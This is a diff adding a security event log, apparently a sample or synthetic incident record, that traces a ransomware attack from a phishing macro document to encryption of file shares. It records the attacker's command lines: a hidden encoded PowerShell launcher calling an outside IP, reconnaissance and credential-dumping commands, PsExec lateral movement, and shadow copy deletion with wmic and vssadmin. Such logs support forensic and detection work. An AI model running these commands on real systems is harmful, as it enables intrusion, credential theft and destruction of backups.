@@ -1,0 +1,24 @@
+2026-04-12T08:14:03Z [mailgw01] postfix/smtpd[2104]: connect from unknown[185.220.101.42]
+2026-04-12T08:14:04Z [mailgw01] postfix/cleanup[2105]: B3F92A: from=<billing@invoiice-dhl.com>, to=<jsmith@acme-corp.example>, size=42819, subject="Outstanding Invoice INV-44820"
+2026-04-12T08:14:05Z [mailgw01] postfix/cleanup[2105]: B3F92A: attachment="invoice_44820.docm" content-type=application/vnd.ms-word.document.macroEnabled.12
+2026-04-12T08:21:47Z [WIN-WS04] Sysmon[1]: ProcessCreate: User=ACME\jsmith Image=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE CommandLine="WINWORD.EXE /n invoice_44820.docm"
+2026-04-12T08:22:04Z [WIN-WS04] Sysmon[1]: ProcessCreate: ParentImage=WINWORD.EXE Image=C:\Windows\System32\cmd.exe CommandLine="cmd.exe /c powershell -nop -w hidden -enc JABjAD0AbgBlAHcALQ..."
+2026-04-12T08:22:05Z [WIN-WS04] Sysmon[3]: NetworkConnect: Image=powershell.exe DestinationIp=45.137.21.118 DestinationPort=443
+2026-04-12T08:22:11Z [WIN-WS04] Sysmon[11]: FileCreate: Image=powershell.exe TargetFilename=C:\Users\jsmith\AppData\Local\Temp\svchst.exe
+2026-04-12T08:22:12Z [WIN-WS04] Sysmon[1]: ProcessCreate: ParentImage=powershell.exe Image=C:\Users\jsmith\AppData\Local\Temp\svchst.exe Hashes=SHA256=8a4b9c2e1d6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b
+2026-04-12T08:22:13Z [WIN-WS04] Sysmon[13]: RegistryEvent: TargetObject=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater Details=C:\Users\jsmith\AppData\Local\Temp\svchst.exe
+2026-04-12T08:24:32Z [WIN-WS04] Sysmon[1]: ProcessCreate: ParentImage=svchst.exe Image=C:\Windows\System32\whoami.exe CommandLine="whoami /all"
+2026-04-12T08:24:35Z [WIN-WS04] Sysmon[1]: ProcessCreate: ParentImage=svchst.exe Image=C:\Windows\System32\net.exe CommandLine="net group ""Domain Admins"" /domain"
+2026-04-12T08:24:42Z [WIN-WS04] Sysmon[1]: ProcessCreate: ParentImage=svchst.exe Image=C:\Windows\System32\nltest.exe CommandLine="nltest /dclist:acme-corp.local"
+2026-04-12T08:31:05Z [WIN-WS04] Sysmon[1]: ProcessCreate: ParentImage=svchst.exe Image=C:\Windows\System32\rundll32.exe CommandLine="rundll32.exe C:\Windows\Temp\sec.dll,DumpCreds"
+2026-04-12T08:31:12Z [WIN-WS04] Sysmon[11]: FileCreate: Image=rundll32.exe TargetFilename=C:\Windows\Temp\hashes.txt
+2026-04-12T08:42:18Z [WIN-DC01] Security[4624]: LogonType=3 Account=ACME\svc_backup SourceIp=10.14.22.55
+2026-04-12T08:42:19Z [WIN-DC01] Security[4672]: SpecialPrivilegesAssigned: Account=ACME\svc_backup
+2026-04-12T08:43:01Z [WIN-FS02] Security[4624]: LogonType=3 Account=ACME\svc_backup SourceIp=10.14.22.55
+2026-04-12T08:43:14Z [WIN-FS02] Sysmon[1]: ProcessCreate: ParentImage=services.exe Image=C:\Windows\PSEXESVC.exe
+2026-04-12T08:43:22Z [WIN-FS02] Sysmon[1]: ProcessCreate: Image=C:\Windows\Temp\enc.exe CommandLine="enc.exe --target=\\fs02\shares --ext=.locked"
+2026-04-12T08:43:25Z [WIN-FS02] Sysmon[3]: NetworkConnect: Image=enc.exe DestinationIp=45.137.21.118 DestinationPort=443
+2026-04-12T08:51:00Z [WIN-FS02] Sysmon[11]: FileCreate: Image=enc.exe TargetFilename=\\fs02\shares\HR\!_README_RECOVER_!.txt
+2026-04-12T08:51:02Z [WIN-FS02] Sysmon[11]: FileCreate: Image=enc.exe TargetFilename=\\fs02\shares\Finance\!_README_RECOVER_!.txt
+2026-04-12T08:51:48Z [WIN-WS04] Sysmon[1]: ProcessCreate: Image=C:\Windows\System32\wbem\wmic.exe CommandLine="wmic shadowcopy delete /nointeractive"
+2026-04-12T08:52:04Z [WIN-WS04] Sysmon[1]: ProcessCreate: Image=C:\Windows\System32\vssadmin.exe CommandLine="vssadmin.exe delete shadows /all /quiet"
